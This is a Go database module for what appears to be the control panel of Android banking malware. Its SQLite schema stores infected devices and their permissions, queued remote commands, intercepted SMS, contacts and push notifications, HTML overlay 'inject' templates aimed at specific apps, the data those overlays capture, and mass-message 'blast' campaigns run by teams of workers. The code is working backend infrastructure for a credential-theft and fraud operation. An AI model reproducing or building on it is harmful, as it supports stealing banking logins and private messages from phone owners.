package db

import (
	"database/sql"
	"fmt"
	"os"
	"path/filepath"

	_ "modernc.org/sqlite"
)

var DB *sql.DB

func Init(dbPath string) error {
	dir := filepath.Dir(dbPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("create db dir: %w", err)
	}

	var err error
	DB, err = sql.Open("sqlite", dbPath+"?_busy_timeout=5000")
	if err != nil {
		return fmt.Errorf("open db: %w", err)
	}

	DB.SetMaxOpenConns(4)

	DB.Exec("PRAGMA journal_mode=WAL")
	DB.Exec("PRAGMA busy_timeout=5000")

	if err := migrate(); err != nil {
		return fmt.Errorf("migrate: %w", err)
	}

	return nil
}

func migrate() error {
	schema := `
	CREATE TABLE IF NOT EXISTS teams (
		id TEXT PRIMARY KEY,
		name TEXT NOT NULL,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE TABLE IF NOT EXISTS users (
		id TEXT PRIMARY KEY,
		team_id TEXT NOT NULL REFERENCES teams(id),
		login TEXT NOT NULL UNIQUE,
		display_name TEXT NOT NULL DEFAULT '',
		password_hash TEXT NOT NULL,
		role TEXT NOT NULL DEFAULT 'worker',
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE TABLE IF NOT EXISTS sessions (
		token TEXT PRIMARY KEY,
		user_id TEXT NOT NULL REFERENCES users(id),
		team_id TEXT NOT NULL,
		login TEXT NOT NULL,
		role TEXT NOT NULL,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		expires_at DATETIME NOT NULL
	);

	CREATE TABLE IF NOT EXISTS devices (
		id TEXT PRIMARY KEY,
		device_id TEXT NOT NULL,
		team_id TEXT NOT NULL REFERENCES teams(id),
		model TEXT NOT NULL DEFAULT '',
		android_version TEXT NOT NULL DEFAULT '',
		country TEXT NOT NULL DEFAULT '',
		is_online INTEGER NOT NULL DEFAULT 0,
		battery_level INTEGER NOT NULL DEFAULT 0,
		permissions TEXT NOT NULL DEFAULT '{}',
		last_seen DATETIME,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE TABLE IF NOT EXISTS commands (
		id TEXT PRIMARY KEY,
		device_id TEXT NOT NULL,
		team_id TEXT NOT NULL,
		command TEXT NOT NULL,
		params TEXT NOT NULL DEFAULT '{}',
		status TEXT NOT NULL DEFAULT 'pending',
		result TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		sent_at DATETIME,
		executed_at DATETIME
	);

	CREATE TABLE IF NOT EXISTS sms (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		device_id TEXT NOT NULL,
		team_id TEXT NOT NULL,
		sender TEXT NOT NULL DEFAULT '',
		body TEXT NOT NULL DEFAULT '',
		sms_type TEXT NOT NULL DEFAULT 'incoming',
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE TABLE IF NOT EXISTS events (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		team_id TEXT NOT NULL,
		device_id TEXT NOT NULL DEFAULT '',
		type TEXT NOT NULL DEFAULT 'connect',
		title TEXT NOT NULL DEFAULT '',
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE TABLE IF NOT EXISTS team_settings (
		team_id TEXT NOT NULL,
		key TEXT NOT NULL,
		value TEXT NOT NULL DEFAULT '',
		PRIMARY KEY (team_id, key)
	);

	CREATE TABLE IF NOT EXISTS inject_templates (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		team_id TEXT NOT NULL,
		target_package TEXT NOT NULL,
		app_name TEXT NOT NULL DEFAULT '',
		html_content TEXT NOT NULL DEFAULT '',
		active INTEGER NOT NULL DEFAULT 1,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE TABLE IF NOT EXISTS inject_data (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		team_id TEXT NOT NULL,
		device_id TEXT NOT NULL,
		target_package TEXT NOT NULL DEFAULT '',
		app_name TEXT NOT NULL DEFAULT '',
		captured_data TEXT NOT NULL DEFAULT '{}',
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE TABLE IF NOT EXISTS contacts (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		device_id TEXT NOT NULL,
		team_id TEXT NOT NULL,
		name TEXT NOT NULL DEFAULT '',
		phone TEXT NOT NULL DEFAULT '',
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE TABLE IF NOT EXISTS blast_campaigns (
		id TEXT PRIMARY KEY,
		team_id TEXT NOT NULL,
		message TEXT NOT NULL DEFAULT '',
		status TEXT NOT NULL DEFAULT 'pending',
		total INTEGER NOT NULL DEFAULT 0,
		sent INTEGER NOT NULL DEFAULT 0,
		created_by TEXT NOT NULL DEFAULT '',
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE TABLE IF NOT EXISTS push_logs (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		device_id TEXT NOT NULL,
		team_id TEXT NOT NULL,
		package TEXT NOT NULL DEFAULT '',
		title TEXT NOT NULL DEFAULT '',
		text TEXT NOT NULL DEFAULT '',
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE TABLE IF NOT EXISTS grabs (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		device_id TEXT NOT NULL,
		team_id TEXT NOT NULL,
		grab_type TEXT NOT NULL DEFAULT '',
		data TEXT NOT NULL DEFAULT '{}',
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE TABLE IF NOT EXISTS action_logs (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		team_id TEXT NOT NULL,
		login TEXT NOT NULL DEFAULT '',
		role TEXT NOT NULL DEFAULT '',
		action TEXT NOT NULL DEFAULT '',
		device_id TEXT NOT NULL DEFAULT '',
		details TEXT NOT NULL DEFAULT '',
		ip TEXT NOT NULL DEFAULT '',
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);

	CREATE INDEX IF NOT EXISTS idx_devices_team ON devices(team_id);
	CREATE INDEX IF NOT EXISTS idx_devices_device_id ON devices(device_id);
	CREATE INDEX IF NOT EXISTS idx_users_team ON users(team_id);
	CREATE INDEX IF NOT EXISTS idx_sessions_expires ON sessions(expires_at);
	CREATE INDEX IF NOT EXISTS idx_commands_device ON commands(device_id, status);
	CREATE INDEX IF NOT EXISTS idx_sms_device ON sms(device_id, team_id);
	CREATE INDEX IF NOT EXISTS idx_events_team ON events(team_id);
	CREATE INDEX IF NOT EXISTS idx_inject_templates_team ON inject_templates(team_id);
	CREATE INDEX IF NOT EXISTS idx_inject_data_team ON inject_data(team_id);
	CREATE INDEX IF NOT EXISTS idx_inject_data_device ON inject_data(device_id);
	CREATE INDEX IF NOT EXISTS idx_contacts_device ON contacts(device_id);
	CREATE INDEX IF NOT EXISTS idx_push_logs_device ON push_logs(device_id);
	CREATE INDEX IF NOT EXISTS idx_grabs_device ON grabs(device_id);
	CREATE INDEX IF NOT EXISTS idx_blast_team ON blast_campaigns(team_id);
	CREATE INDEX IF NOT EXISTS idx_action_logs_team ON action_logs(team_id);
	CREATE INDEX IF NOT EXISTS idx_action_logs_login ON action_logs(login);
	`
	_, err := DB.Exec(schema)
	if err != nil {
		return err
	}

	migrations := []string{
		`ALTER TABLE devices ADD COLUMN permissions TEXT NOT NULL DEFAULT '{}'`,
		`ALTER TABLE devices ADD COLUMN device_type TEXT NOT NULL DEFAULT ''`,
		`ALTER TABLE devices ADD COLUMN phone TEXT NOT NULL DEFAULT ''`,
		`ALTER TABLE devices ADD COLUMN operator TEXT NOT NULL DEFAULT ''`,
		`ALTER TABLE devices ADD COLUMN label TEXT NOT NULL DEFAULT ''`,
		`ALTER TABLE devices ADD COLUMN notes TEXT NOT NULL DEFAULT ''`,
		`ALTER TABLE devices ADD COLUMN apps_list TEXT NOT NULL DEFAULT '[]'`,
		`ALTER TABLE users ADD COLUMN created_by TEXT NOT NULL DEFAULT ''`,
		`ALTER TABLE devices ADD COLUMN worker_id TEXT NOT NULL DEFAULT ''`,
	}
	for _, m := range migrations {
		DB.Exec(m)
	}

	return nil
}

func Close() {
	if DB != nil {
		DB.Close()
	}
}
